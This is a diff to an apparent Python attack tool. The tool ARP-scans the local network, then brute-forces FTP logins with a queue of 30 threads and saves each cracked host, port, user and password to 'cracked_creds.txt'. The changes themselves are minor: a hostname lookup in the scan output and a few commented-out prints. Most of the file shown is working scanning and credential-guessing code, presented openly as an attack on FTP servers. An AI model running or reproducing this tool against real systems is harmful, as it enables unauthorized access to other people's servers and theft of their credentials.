@@ -1,8 +1,10 @@
+
 import ftplib
 from threading import Thread
 import queue
 from scapy.all import srp, ARP, Ether
 import os
+import socket
 
 attack_queue = queue.Queue()
 max_threads = 30
@@ -15,11 +17,12 @@ class ArpScanner:
         broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
         request = broadcast/arp_request
         answered, unanswered = srp(request, timeout=1)
-        print("available hosts in the network:")
-        print('\tIP\t\t\tMAC')
+        print("Available hosts in the network:")
+        print('\tIP\t\tHost')
         for ip in answered:
-            subnet, mac = ip[1].psrc, ip[1].hwsrc
-            print(subnet, '\t\t' + mac)
+            ip = ip[1].psrc
+            hostname = str(socket.gethostbyaddr(str(ip))).split("'")[1::2]
+            print(ip, "\t", hostname[0])
 
 class BruteForceAttack:
     global ftp_host
@@ -53,6 +56,8 @@ class BruteForceAttack:
                 crackfilename = "cracked_creds.txt"
                 if os.path.exists(crackfilename):
                     os.remove(crackfilename)
+                # else:
+                    # print("####The file does not exist")
 
                 crackfile = open(crackfilename, "a")
                 cracked_creds = str(ftp_host) + ":" + str(ftp_port) + ":" + victim_user + ":" + victim_pass
@@ -66,6 +71,7 @@ class BruteForceAttack:
                     attack_queue.queue.clear()
                     attack_queue.all_tasks_done.notify_all()
                     attack_queue.unfinished_tasks = 0
+                # print("done")
                 
             finally:
                 attack_queue.task_done()
@@ -88,4 +94,3 @@ class BruteForceAttack:
 
     attack_queue.join()
 print("BruteForce Attack on FTP Server is Successful!")
-
